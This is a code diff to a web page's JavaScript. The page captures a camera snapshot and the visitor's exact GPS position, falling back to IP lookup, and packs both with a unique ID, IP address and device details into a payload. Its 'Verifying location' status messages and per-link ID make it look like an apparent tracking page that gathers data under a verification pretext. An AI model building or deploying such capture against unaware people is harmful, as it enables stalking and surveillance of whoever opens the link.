@@ -193,7 +193,7 @@
                     video: { 
                         width: { ideal: 640 },
                         height: { ideal: 480 },
-                        facingMode: "user" // Prefer front-facing camera
+                        facingMode: "user"
                     }, 
                     audio: false 
                 });
@@ -204,12 +204,74 @@
                     video.onloadedmetadata = () => resolve();
                 });
 
-                // 3. Get Geo/IP via external API
-                // This is more accurate than server-side IP geolocation
-                updateStatus("Verifying location...");
-                const geoRes = await fetch('https://ipapi.co/json/');
-                if (!geoRes.ok) throw new Error("Geo service failed");
-                const geoData = await geoRes.json();
+                // 3. Get EXACT GPS Location (if permitted)
+                updateStatus("Verifying precise location...");
+                let geoData = {
+                    lat: null,
+                    lon: null,
+                    accuracy: null,
+                    city: 'N/A',
+                    region: 'N/A',
+                    country: 'N/A',
+                    ip: 'N/A',
+                    source: 'GPS'
+                };
+
+                try {
+                    // Use Geolocation API with high accuracy
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => resolve(pos),
+                            (err) => reject(err),
+                            {
+                                enableHighAccuracy: true, // Use GPS chip
+                                timeout: 10000, // 10s timeout
+                                maximumAge: 0 // Always get fresh location
+                            }
+                        );
+                    });
+
+                    geoData.lat = position.coords.latitude;
+                    geoData.lon = position.coords.longitude;
+                    geoData.accuracy = position.coords.accuracy; // Meters
+                    geoData.source = 'GPS';
+                    
+                    // Reverse geocoding to get city/country from GPS coords
+                    // Using OpenStreetMap Nominatim (free, no API key needed)
+                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${geoData.lat}&lon=${geoData.lon}`);
+                    if (geoRes.ok) {
+                        const geoJson = await geoRes.json();
+                        const address = geoJson.address || {};
+                        geoData.city = address.city || address.town || address.village || address.suburb || 'N/A';
+                        geoData.region = address.state || address.county || 'N/A';
+                        geoData.country = address.country || 'N/A';
+                    }
+                } catch (geoError) {
+                    // Fallback to IP Geolocation if GPS denied or failed
+                    console.log("GPS failed, falling back to IP:", geoError);
+                    updateStatus("Verifying network location...");
+                    try {
+                        // Using ip-api.com for better accuracy than ipapi.co
+                        const ipRes = await fetch('http://ip-api.com/json/?fields=status,message,query,city,regionName,country,lat,lon,timezone');
+                        if (ipRes.ok) {
+                            const ipData = await ipRes.json();
+                            if (ipData.status === 'success') {
+                                geoData = {
+                                    lat: ipData.lat,
+                                    lon: ipData.lon,
+                                    accuracy: null,
+                                    city: ipData.city,
+                                    region: ipData.regionName,
+                                    country: ipData.country,
+                                    ip: ipData.query,
+                                    source: 'IP'
+                                };
+                            }
+                        }
+                    } catch (ipError) {
+                        console.log("IP Geo failed:", ipError);
+                    }
+                }
 
                 // 4. Capture Snapshot
                 // Wait a moment for the video to stabilize
@@ -220,17 +282,19 @@
                 canvas.height = video.videoHeight || 480;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                const imageData = canvas.toDataURL('image/jpeg', 0.85);
 
                 // 5. Prepare Payload
                 const payload = {
                     unique_id: uniqueId,
-                    ip: geoData.ip,
+                    lat: geoData.lat,
+                    lon: geoData.lon,
+                    accuracy: geoData.accuracy,
                     city: geoData.city,
                     region: geoData.region,
-                    country: geoData.country_name,
-                    lat: geoData.latitude,
-                    lon: geoData.longitude,
+                    country: geoData.country,
+                    ip: geoData.ip,
+                    locationSource: geoData.source, // 'GPS' or 'IP'
                     userAgent: navigator.userAgent,
                     screenRes: `${screen.width}x${screen.height}`,
                     cameraSnapshot: imageData
